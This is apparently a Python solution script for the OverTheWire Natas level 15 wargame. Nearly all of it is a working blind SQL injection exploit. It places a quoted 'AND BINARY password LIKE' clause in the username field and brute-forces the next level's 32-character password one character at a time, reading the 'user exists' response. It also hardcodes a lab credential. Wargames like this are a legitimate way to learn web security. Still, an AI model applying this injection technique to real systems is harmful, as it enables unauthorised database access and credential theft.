#!/usr/bin/env python

import requests
import re
from string import lowercase, uppercase, digits

characters = lowercase + uppercase + digits
# print(characters)

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
seen_password = list('')
done = False
while(not done):
    for ch in characters:
        #print("trying", "".join(seen_password) + ch)
        response = session.post(url, data={"username": 'natas16" AND BINARY password LIKE "' + "".join(
            seen_password) + ch + '%" # '}, auth=(username, password))
        content = response.text
        if ('user exists' in content):
            seen_password.append(ch)
            break
    print("trying", "".join(seen_password) + ch)
    if len(seen_password) == 32:
        done = True
